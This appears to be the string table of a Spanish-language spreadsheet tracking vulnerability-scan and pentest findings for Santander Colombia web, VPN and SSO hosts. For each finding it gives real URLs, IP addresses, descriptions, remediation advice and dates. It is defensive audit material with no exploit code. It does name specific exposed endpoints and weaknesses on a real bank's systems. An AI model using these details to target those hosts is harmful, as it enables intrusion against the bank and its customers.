    <t>https://www.santander.com.co/Web/Login.aspx?ReturnUrl=%2fWeb%2fPages%2fRequests%2fApp_Themes%2fLogin%2fadm%2f</t>
  </si>
  <si>
    <t>La página web puede enmarcarse. Esto significa que son posibles los ataques de clickjacking contra los usuarios.
https://www.santander.com.co/Web/rb_d56b4438-db41-4f20-9ef1-29ccacb1c640?type=js3&amp;sn=v_4_srv_2_sn_1DF045946C36E5AF08761BA09B3E5506_perc_100000_ol_0_mul_1_app-3A11137600a3d63bf2_1&amp;svrid=2&amp;flavor=post&amp;vi=BKRRAKETCPFFMJLUAOGWDUCDGMOVNQUU-0&amp;modifiedSince=1681523675007&amp;rf=https%3A%2F%2Fwww.santander.com.co%2FWeb%2FLogin.aspx%3FReturnUrl%3D%252FWeb%252F&amp;bp=3&amp;app=11137600a3d63bf2&amp;crc=3711693313&amp;en=3a9l0fyd&amp;end=1</t>
  </si>
  <si>
    <t>Entre los mecanismos habituales de prevención del clickjacking se incluyen:
X-Frame-Options: Se trata de una cabecera de respuesta HTTP que se utiliza para evitar el framing de la página web.
Código JavaScript Framekiller: Se puede utilizar un código JS especial para impedir que un usuario malintencionado enmarque la página. Este método es menos fiable que el uso de X-Frame-Options.</t>
  </si>
  <si>
    <t>QA-WAS-a98fe7f7-c1a4-4509-90ef-37dbf4c8a3d5</t>
  </si>
  <si>
    <t>vpnco1.santander.com.co</t>
  </si>
  <si>
    <t>Se descubrió un archivo, directorio o listado de directorios potencialmente sensible en el servidor
https://vpnco1.santander.com.co/+CSCOE+/message.html?mc=2</t>
  </si>
  <si>
    <t>QA-WAS-260abe18-e185-4b8d-834f-1a4512aebba2</t>
  </si>
  <si>
    <t>Se descubrió un archivo, directorio o listado de directorios potencialmente sensible en el servidor
https://www.santander.com.co/pg/super-deposito-1801.html</t>
  </si>
  <si>
    <t>QA-VM--6209432925000874056</t>
  </si>
  <si>
    <t>Unauthenticated/Open Web Proxy Detected (External)</t>
  </si>
  <si>
    <t>prospera.santanderconsumer.co</t>
  </si>
  <si>
    <t>Los usuarios de Internet no autorizados pueden conectarse a servicios arbitrarios utilizando el protocolo HTTP a través de este proxy. El escáner pudo conectarse a recursos externos en Internet a través de este proxy.</t>
  </si>
  <si>
    <t>Configura tu servidor proxy para que sólo permita conexiones de usuarios/hosts válidos dentro de tu red interna, o para que requiera autenticación para utilizar los servicios proxy. Si necesitas más ayuda sobre cómo hacerlo, ponte en contacto con el proveedor del software proxy.</t>
  </si>
  <si>
    <t>Falso positivo
RITM011117804</t>
  </si>
  <si>
    <t>QA-VM--16819350525993917</t>
  </si>
  <si>
    <t>QA-WAS-f83572eb-32b2-4df9-baa6-b73f948f6df9</t>
  </si>
  <si>
    <t>Se descubrió un archivo, directorio o listado de directorios potencialmente sensible en el servidor Web.</t>
  </si>
  <si>
    <t>MX-QAF-003-014</t>
  </si>
  <si>
    <t>170.169.33.50</t>
  </si>
  <si>
    <t>Se ha observado una página por defecto, propia de la instalación del servicio web o de paquetes software asociados a los recursos afectados. Path: https://www.santander.com.co/Web/ScriptResource.axd</t>
  </si>
  <si>
    <t>Se deben controlar todas las entradas o valores que el aplicativo recibe por parte del cliente, y realizar un tratamiento seguro de sus valores evitando proporcionar información útil a un posible atacante. Adicionalmente para no proporcionar información al atacante se recomienda personalizar las páginas de error para que no sean descriptivas.</t>
  </si>
  <si>
    <t>Al introducir caracteres no esperados en los parámetros recibidos por la aplicación esta devuelve errores no controlados que aportan información acerca de la arquitectura utilizada.</t>
  </si>
  <si>
    <t>MX-QAF-004-014</t>
  </si>
  <si>
    <t>Múltiples métodos HTTP permitidos</t>
  </si>
  <si>
    <t>Los servidores Web utilizan ciertos métodos o funciones propias del protocolo HTTP para funcionar; siendo los más utilizados GET; POST y HEAD. Como resultado del análisis de los servicios Web internos; se ha detectado que los recursos afectados permiten utilizar métodos HTTP adicionales (OPTIONS); los cuales podrían no ser requeridos; debilitando la seguridad de dichos servicios Web.
Los servidores Web utilizan ciertos métodos o funciones propias del protocolo HTTP para funcionar siendo los más utilizados GET POST y HEAD. Como resultado del análisis de los servicios Web internos se ha detectado que los recursos afectados permiten utilizar métodos HTTP adicionales (OPTIONS TRACE GET HEAD DELETE PUT POST COPY MOVE MKCOL PROPFIND PROPPATCH LOCK UNLOCK SEARCH) los cuales podrían no ser requeridos debilitando la seguridad de dichos servicios Web.</t>
  </si>
  <si>
    <t>Se recomienda evaluar la necesidad de utilizar todos los métodos que se encuentran actualmente disponibles en los servidores web; y en caso de identificar métodos no requeridos; los mismos deberían ser deshabilitados.
La solución depende de la infraestructura: En Apache: Las nuevas versiones de Apache (1.3.34, 2.0.55 y posterior) tienen una directiva denominada TraceEnable: TraceEnable off Para versiones anteriores, se recomienda utilizar el módulo mod_rewrite: RewriteEngine On RewriteCond %{REQUEST_METHOD} ^TRACE RewriteRule .* - [F] En IIS, PWS, Microsoft-IIS, Internet Information Server, Internet Information Services, Microsoft-PWS: Se recomienda utilizar la herramienta URLScan: http://www.microsoft.com/technet/security/tools/urlscan.mspx Java System Web Server, SunONE WebServer, Sun-ONE-Web-Server, iPlanet Se recomienda aplicar la siguiente configuración en el fichero 'obj.conf' : AuthTrans fn=""set-variable"" remove-headers=""transfer-encoding"" set-headers=""content-length: -1"" error=""501"" Para Sun ONE/iPlanet Web Server anteriores a la versión v6.0 SP2, se recomienda seguir las siguientes instrucciones oficiales: http://sunsolve.sun.com/pub-cgi/retrieve.pl?doc=fsalert%2F50603 En Lotus Domino: Se recomienda añadir la siguiente directiva en el fichero NOTES.INI: HTTPDisableMethods=TRACE</t>
  </si>
  <si>
    <t>Los métodos HTTP anteriormente expuestos podrían permitir a un atacante realizar distintas acciones en el servidor, como ser la creación y/o eliminación de información.</t>
  </si>
  <si>
    <t>MX-QAF-018-001</t>
  </si>
  <si>
    <t>Información sensible en el banner del Servidor Web</t>
  </si>
  <si>
    <t xml:space="preserve">Se ha detectado la presencia de cabeceras http identificativas de servidor web y sistema operativo: Server: Microsoft IIS/7.5 X-Powered-By: ASP.NET 
</t>
  </si>
  <si>
    <t>Para solucionar los problemas de identificación de plataforma hay que: 1.Controlar los errores de las aplicaciones y mostrar errores genéricos. 
2. Controlar los errores del servidor y mostrar errores genéricos. 
3. Cambiar las cabeceras enviadas por los servidores web. Seguir leyendo para más información. 
4. Modificación de las cabeceras de los servidores web: Internet Information Server (IIS) Debido a lo extenso de la explicación no se expondrá en este documento, pero se puede consultar una guía paso a paso sobre cómo modificar las cabeceras para evitar la identificación de la plataformas en: http://www.4guysfromrolla.com/articles/120209-1.aspx Apache Para evitar que apache envíe las cabeceras siga los siguientes pasos: 
1. Abra su archivo de configuración de Apache (httpd.conf). 
2. En la sección de configuración general, añada la siguiente sentencia: ServerSignature Off</t>
  </si>
  <si>
    <t>Mostrar información sensible como el versionado del servidor web ofrece información de gran utilidad a un potencial atacante que podría enfocar los intentos de explotación hacia las vulnerabilidades existentes en esa versión de servidor concreta. La explotación se consigue mediante el envío de una petición HTTP. La respuesta por parte del servidor contiene una cabecera HTTP que muestra la versión del servicio Web utilizado.</t>
  </si>
  <si>
    <t>MX-QAF-027-001</t>
  </si>
  <si>
    <t>Posibilidad de mailing masivo</t>
  </si>
  <si>
    <t>Se ha identificado que el recurso afectado es vulnerable al envío masivo de mensajes, al no implementarse mecanismos que impidan o dificulten la utilización de herramientas automatizadas en el formulario de "registro en línea". URL afectada: https://www.santander.com.co/Web/Pages/Requests/RequestServices_Step2.aspx
Se recomienda implementar en los recursos afectados, mecanismos que dificulten la automatización de envío de correos electrónicos. Para ello, se pueden implementar mecanismos de CAPTCHA que sigan las siguientes directrices: - La validación del desafío se realizará en el servidor. - No se transmitirá al cliente información que pueda facilitar la resolución del desafío (nombres de archivo e imágenes, validación en el lado cliente, etc.). - El CAPTCHA mostrado deberá ser elegido aleatoriamente y de forma no predecible. - Los CAPTCHAS utilizados deberán tener caracteres rotados. - Los CAPTCHAS utilizados deberán tener caracteres de distintas alturas y tamaños. - Los CAPTCHAS utilizados deberán tener caracteres de diferentes colores. - Los CAPTCHAS utilizados deberán tener caracteres deformados. - Los CAPTCHAS utilizados deberán tener caracteres tachados.</t>
  </si>
  <si>
    <t>Se recomienda implementar mecanismos que dificulten la automatización del proceso de envío de mensajes, como podría ser la utilización de CAPTCHAS, que requieran la intervención del usuario en el proceso.</t>
  </si>
  <si>
    <t>La observación identificada podría permitir a un usuario malicioso colapsar la bandeja de entrada del servicio, lo que podría converger en el peor de los casos en una Denegación de Servicio.</t>
  </si>
  <si>
    <t>MX-QAF-074-005</t>
  </si>
  <si>
    <t>Login susceptible a ataques de fuerza bruta</t>
  </si>
  <si>
    <t>S ha observado que los formularios de login de los recursos especificado son susceptibles de sufrir ataques de fuerza bruta, ya que no limitan los intentos de acceso o muestran información de relevancia para la enumeración de usuarios. URL afectadas: https://www.santander.com.co/Web/Login.aspx 
Una de las opciones para impedir ataques de fuerza bruta es utilizar restricciones como las que ofrecen los captchas.</t>
  </si>
  <si>
    <t>Se recomienda implementar mecanismos de prevención contra ataques de fuerza bruta, como el bloqueo de la cuenta de usuarios tras un número de intentos erróneos o soluciones de seguridad como captchas.</t>
  </si>
  <si>
    <t>Es posible que un atacante pueda ganar acceso a una cuenta realizando un ataque de fuerza bruta mediante un ataque de diccionario.</t>
  </si>
  <si>
    <t>QA-WAS-f6f4c0db-9637-4e7a-944c-9d38f8a580c5</t>
  </si>
  <si>
    <t>Se descubrió un archivo, directorio o listado de directorios potencialmente sensible en el servidor Web.
https://www.santander.com.co/Web/Login.aspx?ReturnUrl=%2fWeb%2fPages%2f.svn%2fentries</t>
  </si>
  <si>
    <t>MAN-6568b43e2f03616c9296d29b</t>
  </si>
  <si>
    <t>CO-23-CNMPO-011-CO-001</t>
  </si>
  <si>
    <t>HTTP Strict Transport Security (HSTS)</t>
  </si>
  <si>
    <t>Se ha comprobado que el servidor remoto no incluye en las cabeceras de respuesta la cabecera "Strict-Transport-Security", la cual fuerza el uso de la política HSTS y, por lo tanto, no fuerza al navegador a comunicarse únicamente mediante canales cifrados HTTPS.</t>
  </si>
  <si>
    <t>Se recomienda la configuración del servidor remoto para que en las cabeceras de respuesta se incluya la cabecera HSTS incluyendo un período de validez estimado de la política en el propio navegador. https://docs.microsoft.com/en-us/iis/get-started/whats-new-in-iis-10-version-1709/iis-10-version-1709-hsts</t>
  </si>
  <si>
    <t>En caso de no configurar la cabecera HTTP Strict Transport Security correctamente en el servidor web, un atacante podría interceptar las comunicaciones entre un cliente legítimo y el servidor Web y forzarle a utilizar HTTP sin cifrar, de manera que las comunicaciones entre cliente y servidor se harían en texto plano y, por tanto, dejarían expuestos datos sensibles o contraseñas. Dada la situación, el robo de datos y el secuestro de sesión es altamente probable.</t>
  </si>
  <si>
    <t>1° Fecha: 24/02/2024
2: Fecha: 31/07/2024</t>
  </si>
  <si>
    <t>MAN-661fbd2d8f819f39594a8627</t>
  </si>
  <si>
    <t>CO-24-CNMPO-001-AP-001</t>
  </si>
  <si>
    <t>Uso de librerías con vulnerabilidades conocidas</t>
  </si>
  <si>
    <t>CVE-2021-41182:
CVE-2021-41184:
CVE-2021-41183:
CVE-2022-31160:
CVE-2011-4969:
CVE-2012-6708:
CVE-2020-7656:
CVE-2015-9251
CVE-2019-11358
CVE-2020-11023
CVE-2020-11022</t>
  </si>
  <si>
    <t>Se ha detectado la versión 1.12.1 de jquery-ui
Se ha detectado la versión 1.4.2 de jquery
Si bien esta versión está Obsoleta, y ha sido identificada en la aplicación, no se ha observado que se haga uso de ella, ya que se hace uso de la versión 3.4.1 indicada como vulnerable en informes previos de auditoría.</t>
  </si>
  <si>
    <t>En primer lugar, se recomienda actualizar los activos afectados a la última versión disponible sin vulnerabilidades conocidas. Es caso de no ser posible, se deberán aplicar todos los parches disponibles con el objeto de minimizar el riesgo asociado a la vulnerabilidad.</t>
  </si>
  <si>
    <t>El uso de software o librerías de terceros sin actualizar puede ser comprometido mediante vulnerabilidades conocidas poniendo en riesgo el activo afectado.</t>
  </si>
  <si>
    <t>Recurso bloqueado por la política de seguridad de contenidos (CSP)</t>
  </si>
  <si>
    <t>Warn</t>
  </si>
  <si>
    <t>Validación de medidas de seguridad como ISR y CSP para garantizar que no se incluye ningún recurso remoto malicioso en una aplicación web.
Refused to load the script 'https://www.googletagmanager.com/gtag/js?id=G-RDCC177MR7&amp;cx=c&amp;_slc=1' because it violates the following Content Security Policy directive: "script-src 'self' https://www.google-analytics.com 'unsafe-hashes' 'sha256-Mejfqw/rcuPAXLq+LvRkhI5YwxTF3F/V3Hx9uU7Cem0=' 'sha256-qN1ztfNu7xgEFHo8+X4eI8Ing1P9bO1CzFk3xCQfgkQ=' 'sha256-Q+qomrZ1pEZHeC01QESfHKnCjnzuW+wS64SJ94cd7eU=' 'sha256-lvvj5Y94uJd2owx4udhFH/Ovi2qOZxmnruIlF+TAd9w=' 'sha256-xrczspkw95tQ1dAcwlL1jSgCnxmmVSUklZ9Q6ohZfYI=' 'sha256-BihYdWDxuuHcPK9cVceix+MuRiw3AROVh7pc+mApIH0=' 'sha256-d90TvGS55n09UiJAhzG6xGjF3Gm9YH4umQycQSq76Oc=' 'sha256-KXuYyfHKAftAQdoBsibeqApF9skaF/wmnM4QcNpzhrY=' 'sha256-B+z+r+8poOlpRTA/5UTc9+ba09cP1IGA/gg0KhnWi48=' 'sha256-vI7fz2T0edVoCOfHGv9KsWni/5c1l39ZabC41RzA7HE=' 'sha256-QjzI5L7Hnq+9D3fw7EdfQiOVj26uHNgDHNbNjTgJpw8=' 'sha256-BBobMUbBLQ1n63cvVz77C1RTv9OLoISg6uv85pDAIGQ=' 'sha256-4DBs4D/nRR0L4zmUqqrJ1/CO0yjEN3CeJhHMdv+FwgE=' 'sha256-n5uSXQWDGoSegGiEaJlavk0NhyLhhQXyfzIFUctJ930=' 'sha25...
Refused to execute inline script because it violates the following Content Security Policy directive: "script-src 'self' https://www.google-analytics.com 'unsafe-hashes' 'sha256-Mejfqw/rcuPAXLq+LvRkhI5YwxTF3F/V3Hx9uU7Cem0=' 'sha256-qN1ztfNu7xgEFHo8+X4eI8Ing1P9bO1CzFk3xCQfgkQ=' 'sha256-Q+qomrZ1pEZHeC01QESfHKnCjnzuW+wS64SJ94cd7eU=' 'sha256-lvvj5Y94uJd2owx4udhFH/Ovi2qOZxmnruIlF+TAd9w=' 'sha256-xrczspkw95tQ1dAcwlL1jSgCnxmmVSUklZ9Q6ohZfYI=' 'sha256-BihYdWDxuuHcPK9cVceix+MuRiw3AROVh7pc+mApIH0=' 'sha256-d90TvGS55n09UiJAhzG6xGjF3Gm9YH4umQycQSq76Oc=' 'sha256-KXuYyfHKAftAQdoBsibeqApF9skaF/wmnM4QcNpzhrY=' 'sha256-B+z+r+8poOlpRTA/5UTc9+ba09cP1IGA/gg0KhnWi48=' 'sha256-vI7fz2T0edVoCOfHGv9KsWni/5c1l39ZabC41RzA7HE=' 'sha256-QjzI5L7Hnq+9D3fw7EdfQiOVj26uHNgDHNbNjTgJpw8=' 'sha256-BBobMUbBLQ1n63cvVz77C1RTv9OLoISg6uv85pDAIGQ=' 'sha256-4DBs4D/nRR0L4zmUqqrJ1/CO0yjEN3CeJhHMdv+FwgE=' 'sha256-n5uSXQWDGoSegGiEaJlavk0NhyLhhQXyfzIFUctJ930=' 'sha256-v4JClfcQS+AyJ6vwkfElMQAUFRqmgGaShAa/YLtBWvE=' 'sha256-Isf+HG1uL...
Refused to load the script 'https://www.googletagmanager.com/gtag/js?id=G-RDCC177MR7&amp;l=dataLayer&amp;cx=c' because it violates the following Content Security Policy directive: "script-src 'self' https://www.google-analytics.com 'unsafe-hashes' 'sha256-Mejfqw/rcuPAXLq+LvRkhI5YwxTF3F/V3Hx9uU7Cem0=' 'sha256-qN1ztfNu7xgEFHo8+X4eI8Ing1P9bO1CzFk3xCQfgkQ=' 'sha256-Q+qomrZ1pEZHeC01QESfHKnCjnzuW+wS64SJ94cd7eU=' 'sha256-lvvj5Y94uJd2owx4udhFH/Ovi2qOZxmnruIlF+TAd9w=' 'sha256-xrczspkw95tQ1dAcwlL1jSgCnxmmVSUklZ9Q6ohZfYI=' 'sha256-BihYdWDxuuHcPK9cVceix+MuRiw3AROVh7pc+mApIH0=' 'sha256-d90TvGS55n09UiJAhzG6xGjF3Gm9YH4umQycQSq76Oc=' 'sha256-KXuYyfHKAftAQdoBsibeqApF9skaF/wmnM4QcNpzhrY=' 'sha256-B+z+r+8poOlpRTA/5UTc9+ba09cP1IGA/gg0KhnWi48=' 'sha256-vI7fz2T0edVoCOfHGv9KsWni/5c1l39ZabC41RzA7HE=' 'sha256-QjzI5L7Hnq+9D3fw7EdfQiOVj26uHNgDHNbNjTgJpw8=' 'sha256-BBobMUbBLQ1n63cvVz77C1RTv9OLoISg6uv85pDAIGQ=' 'sha256-4DBs4D/nRR0L4zmUqqrJ1/CO0yjEN3CeJhHMdv+FwgE=' 'sha256-n5uSXQWDGoSegGiEaJlavk0NhyLhhQXyfzIFUctJ930=' '...</t>
  </si>
  <si>
    <t>Los propietarios de sitios web deben revisar sus sitios en busca de mensajes de violación de CSP. Estos mensajes suelen indicar que el sitio está intentando cargar recursos externos desconocidos o no verificados. Encontrará información detallada sobre estas infracciones en la sección de detalles de las pruebas.
Solución: debe bloquear los llamados a recursos externos</t>
  </si>
  <si>
    <t>Pre:
1° Fecha: 09/08/2024
2° Fecha: 02/09/2024
Pro:
1° Fecha: 14/09/2024</t>
  </si>
  <si>
    <t>Se ha detectado una configuración incorrecta del CSP</t>
  </si>
  <si>
    <t>Una Política de Seguridad de Contenidos (CSP) correctamente configurada puede ayudar a prevenir ataques de cross-site scripting (XSS) restringiendo los orígenes de JavaScript, CSS y otros recursos potencialmente peligrosos. Una CSP adecuada debería Implementar directivas que establezcan restricciones de origen válidas desde donde el cliente puede cargar marcos y scripts, así como limitar donde el cliente puede enviar datos de formularios. Restringir plugins y especificar un recurso válido para informar de violaciones de la política. No contener palabras clave "inseguras" ni incluir comodines que sean ineficaces para restringir fuentes. Para esta evaluación, nos centraremos en el objetivo más esencial de una buena Política de Seguridad de Contenidos, que es prevenir los ataques de Cross Site Scripting y de inyección de contenido dinámico.
script-src</t>
  </si>
  <si>
    <t>Recomendamos revisar el CSP de cada sitio Web de forma que sea eficaz a la hora de cumplir los objetivos de seguridad definidos para la Política de Seguridad de Contenidos, tales como: Impedir la carga de recursos de contenido y scripts no autorizados. Impedir el clickjacking y otros ataques de marcos anidados. Garantizar que los formularios web y los enlaces se comportan según lo previsto. Específicamente para esta evaluación, nos estamos centrando principalmente en la prevención de ataques de Cross Site Scripting. Por lo tanto, para obtener una BUENA calificación, basta con: Implementar directivas que establezcan restricciones de fuente válidas y completas para la carga de contenido dinámico (script-src, object-src, default-src). Evitar el uso de directivas inseguras como 'unsafe-eval' y 'unsafe-inline'. Evitar errores tipográficos o directivas CSP no válidas. Evitar comodines, listas permitidas basadas en host o esquemas de URL vacíos como "HTTP" en las directivas fuente.
Las listas de permisos de host pueden eludirse con frecuencia. Considere el uso de 'strict-dynamic' en combinación con CSP nonces o hashes.</t>
  </si>
  <si>
    <t>Pre:
1° Fecha: 30/08/2024
Pro:
1° Fecha: 28/09/2024</t>
  </si>
  <si>
    <t>Falta el atributo de integridad</t>
  </si>
  <si>
    <t>La página no incluye un atributo de integridad en la obtención de scripts entre dominios.
https://www.googletagmanager.com/gtag/js?id=G-RDCC177MR7&amp;l=dataLayer&amp;cx=c: Falta el atributo de integridad
https://www.googletagmanager.com/gtag/js?id=G-RDCC177MR7&amp;cx=c&amp;_slc=1: Falta el atributo de integridad
//www.google-analytics.com/analytics.js: Falta el atributo de integridad</t>
  </si>
  <si>
    <t>Los propietarios de sitios web deben evitar cargar secuencias de comandos de recursos de terceros, para no exponerse a la manipulación de contenidos y JavaScript por parte de terceros o en caso de que la red se vea comprometida. Si la carga de scripts de terceros es inevitable, deben utilizarse etiquetas de integridad de subrecursos siempre que sea posible. Para más información, consulte:
https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity</t>
  </si>
  <si>
    <t>Política potencialmente insegura: Cabeceras ineficaces: Content-Security-Policy</t>
  </si>
  <si>
    <r>
      <t xml:space="preserve">Esta Content-Security-Policy (CSP) tiene problemas que posiblemente la hacen insegura.
La implementación de estos encabezados no sigue las mejores prácticas de seguridad.
Content-Security-Policy:
</t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t>reporting-objective</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t xml:space="preserve">: No se utiliza ninguna directiva de información
</t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t>form-action-objective</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t xml:space="preserve">: Limitación del privilegio de solicitud (Formulario-Acciones)
</t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t>code-injection-objective</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t xml:space="preserve">: Prevención limitada de la inyección de código
</t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t>default-src</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t>: Falta default-src</t>
    </r>
  </si>
  <si>
    <r>
      <t xml:space="preserve">Elimine cualquier instancia de directivas "unsafe-" y fuentes "blob, data, filesystem". Asegúrese de que sus directivas CSP están correctamente configuradas.
Asegúrese de que sus cabeceras se implementan correctamente, como se indica en RFC-7231. Sus cabeceras no deben permitir el almacenamiento en caché de contenido cifrado. También deben tener permisos específicos (en lugar de utilizar comodines u otras generalizaciones) y estar formateados correctamente.
</t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t>reporting-objective</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t xml:space="preserve">: Incluir una directiva de notificación con una ubicación o grupo válidos.
</t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t>form-action-objective</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t xml:space="preserve">: Incluya la directiva form-actions en su CSP.
</t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t>code-injection-objective</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t xml:space="preserve">: No utilice ninguna palabra clave "insegura" y utilice hosts explícitos para cualquier directiva de la lista de fuentes.
</t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t>default-src</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t>: Utilice la directiva default-src en su Content-Security-Policy (CSP), tal y como se especifica en W3C CSP.
https://www.w3.org/TR/CSP/
https://datatracker.ietf.org/doc/html/rfc7231</t>
    </r>
  </si>
  <si>
    <t>DNS</t>
  </si>
  <si>
    <t>DNS Server Accessible</t>
  </si>
  <si>
    <t>170.169.97.34</t>
  </si>
  <si>
    <t>27/'4/2024</t>
  </si>
  <si>
    <t>No es intrínsecamente arriesgado exponer un servidor DNS, que traduce nombres de dominio, como ejemplo.com, en direcciones IP que los navegadores utilizan para encontrar y acceder a sitios web. La mayoría de los operadores de red ayudan a la navegación web pública con servidores DNS orientados a Internet. Un servidor DNS mal configurado, sin embargo, puede ser vulnerable a una redirección maliciosa de la web R o a un ataque de denegación de servicio distribuido (DDoS), en el que un atacante inunda los servidores DNS de un dominio para interrumpir la resolución DNS para ese dominio.</t>
  </si>
  <si>
    <t>Realice una auditoría de seguridad de la configuración de su servidor DNS y aplique los controles necesarios, como un cortafuegos o extensiones de seguridad DNS.</t>
  </si>
  <si>
    <t>ASM-Pentesting</t>
  </si>
  <si>
    <t>SSO Prospera</t>
  </si>
  <si>
    <t>ASM-190424-0012</t>
  </si>
  <si>
    <t>Spring Boot Misconfiguration</t>
  </si>
  <si>
    <t>https://sso-management.servicios.santanderconsumer.co</t>
  </si>
  <si>
    <t>Spring Boot incluye una serie de características adicionales llamadas actuadores para ayudar a supervisar y controlar una aplicación cuando se empuja a la producción. Los actuadores permiten controlar y supervisar una aplicación utilizando puntos finales HTTP o JMX. La auditoría, la salud y la recopilación de métricas también pueden abrir una puerta oculta al servidor si se ha configurado mal una aplicación.
https://sso-management.servicios.santanderconsumer.co/actuator</t>
  </si>
  <si>
    <t>Los puntos finales pueden personalizarse mediante las propiedades de Spring. Puede cambiar si un endpoint Por defecto, todos los endpoints excepto shutdown están habilitados. Si prefiere habilitar específicamente un endpoint puede utilizar la propiedad endpoints.enabledpoint está habilitado, si se considera sensible e incluso su id. Del mismo modo, también puede optar por establecer globalmente la bandera "sensible" de todos los puntos finales.</t>
  </si>
  <si>
    <t>Esacalada: 24/04/2024
Certificada</t>
  </si>
  <si>
    <t>El sitio emite registros visibles del navegador</t>
  </si>
  <si>
    <t>Los registros del navegador hacen referencia a los mensajes o la información generada por los scripts o los procesos back-end de un sitio web que se envían directamente a la consola del navegador. Estos registros suelen incluir información de depuración, mensajes de error, advertencias u otros resultados de diagnóstico que los desarrolladores y usuarios utilizan para solucionar problemas.</t>
  </si>
  <si>
    <t>- Limite los registros del navegador a la información de diagnóstico esencial.
- Evite registrar datos sensibles como credenciales de usuario o información personal identificable.
- Implemente controles para restringir el acceso a los registros del navegador únicamente al personal autorizado.
- Utilice técnicas de cifrado u ofuscación para proteger la información confidencial de los registros.
- Revise y controle regularmente los registros del navegador para detectar cualquier actividad inusual o sospechosa.</t>
  </si>
  <si>
    <t>El riesgo de emitir registros del navegador reside en la potencial exposición de información sensible a partes no autorizadas. Estos registros pueden revelar inadvertidamente credenciales de usuario, información de identificación personal u otros datos confidenciales, que pueden ser explotados por actores maliciosos para el robo de identidad, fraude u otros fines nefastos. Además, exponer detalles internos del sistema o mensajes de error puede proporcionar a los atacantes información sobre posibles vulnerabilidades o puntos débiles en la infraestructura del sitio web.</t>
  </si>
  <si>
    <t>El sitio no carga los componentes de la página</t>
  </si>
  <si>
    <t>Los componentes de un sitio web incluyen diferentes elementos que contribuyen colectivamente a la estructura, apariencia y funcionalidad de una página web. Estos componentes incluyen contenido textual, imágenes, hojas de estilo que definen la maquetación y el diseño, scripts que permiten la interactividad, archivos multimedia, fuentes para la tipografía, menús de navegación, formularios para las entradas del usuario y widgets o plugins para funcionalidades adicionales. Juntos, estos componentes crean una experiencia de usuario cohesionada, facilitando la navegación, la interacción y la difusión de información en el sitio web. Cada componente desempeña un papel vital en la difusión de contenidos, la mejora del atractivo visual y la participación del usuario.
Path: www.santander.com.co/img/sep_head_btns.png</t>
  </si>
  <si>
    <t>- Optimice la distribución de componentes minimizando el tamaño de los archivos y aprovechando las técnicas de almacenamiento en caché.
- Utilice redes de distribución de contenidos (CDN) para distribuir los componentes y mejorar la velocidad de carga.
- Implemente sólidos mecanismos de gestión de errores para gestionar con elegancia los fallos de carga de los componentes.
- Utilice opciones alternativas o contenidos alternativos para los componentes críticos, con el fin de garantizar una experiencia de usuario fluida, incluso en caso de fallos de carga.
- Supervise regularmente el rendimiento del sitio web y realice pruebas en distintos dispositivos y condiciones de red.</t>
  </si>
  <si>
    <t>Cuando componentes esenciales como imágenes, hojas de estilo, secuencias de comandos o contenido multimedia no se cargan, los diseños pueden quedar rotos, las funciones incompletas y la interactividad reducida. Esto provoca frustración en los usuarios y una posible pérdida de compromiso. Además, puede afectar negativamente a la credibilidad del sitio web, la percepción de la marca y las tasas de conversión, ya que los usuarios pueden percibirlo como poco fiable o poco profesional.</t>
  </si>
  <si>
    <t>CDT</t>
  </si>
  <si>
    <t>QA-WAS-fe02b06b-7a4e-4200-944f-26a6b7c0655d</t>
  </si>
  <si>
    <t>Sensitive Files Disclosure</t>
  </si>
  <si>
    <t>assets.cdt.santander.com.co</t>
  </si>
  <si>
    <t>Se descubrió un archivo potencialmente confidencial en el servidor web. Este archivo puede o no estar asociado directamente con la aplicación web.
Archivos comprobados:
